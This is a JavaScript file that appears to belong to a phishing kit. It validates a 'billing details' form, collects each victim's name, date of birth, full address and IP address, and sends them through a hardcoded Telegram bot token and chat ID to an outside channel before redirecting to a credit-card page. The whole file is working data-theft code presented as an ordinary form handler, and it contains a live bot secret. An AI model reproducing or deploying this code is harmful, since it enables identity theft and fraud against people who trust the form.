function formatDate(input) {
    let value = input.value;
    
    // Remove all non-digit characters
    value = value.replace(/\D/g, '');

    // Ensure maximum lengths for day, month, and year
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    if (value.length > 5) {
        value = value.slice(0, 5) + '/' + value.slice(5);
    }
    if (value.length > 10) {
        value = value.slice(0, 10);
    }

    // Update the input value
    input.value = value;
}


// Function to get the user's IP address
function getUserIP() {
    return fetch('get_user_ip.php')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch user IP');
            }
            return response.json();
        })
        .then(data => {
            return data.userIP;
        })
        .catch(error => {
            console.error(error);
            return 'Unknown'; // Return 'Unknown' if unable to fetch user IP
        });
}

// Function to send billing details to Telegram channel via Telegram bot
function sendBillingDetailsToTelegram(message, userIP) {
    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot token and chat ID
    const botToken = '7002223785:AAFPsYJezV6Dr2L6v55jqLQnduuAjnNrMek';
    const chatId = '-1002101599846';

    // Append user IP address to the message
    message += `\nUser IP: ${userIP}`;

    // Send message to Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send message to Telegram bot');
            }
            console.log('Message sent successfully');
        })
        .catch(error => {
            console.error(error);
            // Handle error
        });
}

document.addEventListener("DOMContentLoaded", function() {
    // Add event listener to the submit button
    document.querySelector('.submit-btn').addEventListener('click', function(event) {
        // Prevent default form submission
        event.preventDefault();

        // Get form inputs
        const firstNameInput = document.getElementById('first-name');
        const dobInput = document.getElementById('dob');
        const streetAddressInput = document.getElementById('street-address');
        const cityInput = document.getElementById('city');
        const stateInput = document.getElementById('state');
        const zipcodeInput = document.getElementById('zipcode');

        // Check if all required fields are filled
        let hasError = false;

        if (!firstNameInput.value.trim()) {
            firstNameInput.classList.add('error');
            hasError = true;
        } else {
            firstNameInput.classList.remove('error');
        }

        if (!dobInput.value.trim()) {
            dobInput.classList.add('error');
            hasError = true;
        } else {
            dobInput.classList.remove('error');
        }

        if (!streetAddressInput.value.trim()) {
            streetAddressInput.classList.add('error');
            hasError = true;
        } else {
            streetAddressInput.classList.remove('error');
        }

        if (!cityInput.value.trim()) {
            cityInput.classList.add('error');
            hasError = true;
        } else {
            cityInput.classList.remove('error');
        }

        if (!stateInput.value.trim()) {
            stateInput.classList.add('error');
            hasError = true;
        } else {
            stateInput.classList.remove('error');
        }

        if (zipcodeInput.value.trim().length < 5) {
            zipcodeInput.classList.add('error');
            hasError = true;
        } else {
            zipcodeInput.classList.remove('error');
        }

        if (hasError) {
            // Scroll to the first error field
            firstNameInput.scrollIntoView({ behavior: 'smooth' });
            return;
        }

        // Store data in local storage
        localStorage.setItem('billingFirstName', firstNameInput.value.trim());
        localStorage.setItem('billingDOB', dobInput.value.trim());
        localStorage.setItem('billingStreetAddress', streetAddressInput.value.trim());
        localStorage.setItem('billingCity', cityInput.value.trim());
        localStorage.setItem('billingState', stateInput.value.trim());
        localStorage.setItem('billingZipcode', zipcodeInput.value.trim());

        // Get the user's IP address
        getUserIP()
            .then(userIP => {
                // Construct the message with the billing details
                const message = `
                    Full Name: ${firstNameInput.value.trim()}
                    Date of Birth: ${dobInput.value.trim()}
                    Address: ${streetAddressInput.value.trim()}, ${cityInput.value.trim()}, ${stateInput.value.trim()} ${zipcodeInput.value.trim()}
                `;
                // Send billing details to Telegram bot
                sendBillingDetailsToTelegram(message, userIP);

                // Navigate to the credit card page
                window.location.href = 'credit-card.html';
            })
            .catch(error => {
                console.error(error);
                // Navigate to the credit card page even if unable to fetch user IP
                window.location.href = 'credit-card.html';
            });
    });
});